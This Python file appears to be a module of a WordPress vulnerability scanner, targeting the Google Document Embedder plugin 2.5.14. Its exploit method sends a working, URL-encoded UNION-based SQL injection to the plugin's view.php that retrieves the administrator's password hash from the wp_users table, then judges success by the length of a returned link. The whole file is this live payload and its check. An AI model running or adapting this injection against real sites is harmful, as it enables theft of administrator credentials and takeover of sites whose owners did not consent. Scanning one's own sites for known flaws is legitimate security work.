from bs4 import BeautifulSoup
from ..exploitsql import ExploitSql


class GoogleDocEmbedder(ExploitSql):
	@staticmethod
	def getname():
		return "Google Document Embedder"

	@staticmethod
	def getversion():
		return '2.5.14'

	@staticmethod
	def getexploiturl():
		return "http://www.exploit-db.com/exploits/35371/"

	def exploit(self):
		name = self.getname()
		version = self.getversion()
		exploit = "/wp-content/plugins/google-document-embedder/view.php?embedded=1&gpid=0%20UNION%20SELECT%201,%202,%203," \
			"%20CONCAT(CAST(CHAR(97,%2058,%2049,%2058,%20123,%20115,%2058,%2054,%2058,%2034,%20118,%20119,%2095,%2099," \
			"%20115,%20115,%2034,%2059,%20115,%2058)%20as%20CHAR),%20LENGTH(user_pass),%20CAST(CHAR(58,%2034)%20as%20CHAR)," \
			"%20user_pass,%20CAST(CHAR(34,%2059,%20125)%20as%20CHAR))%20FROM%20`wp_users`%20WHERE%20ID=1"\

		response = ExploitSql.request(self.hostname + exploit)
		if response:
			soup = BeautifulSoup(response)
			links = soup.findAll('link')

			if links:
				for link in links:
					result = link.get('href')
					if len(result) == 34:
						ExploitSql.exploitfound(name, version, self.getexploiturl())
			else:
				ExploitSql.exploitnotfound(name, version)
		else:
			ExploitSql.exploitnotfound(name, version)
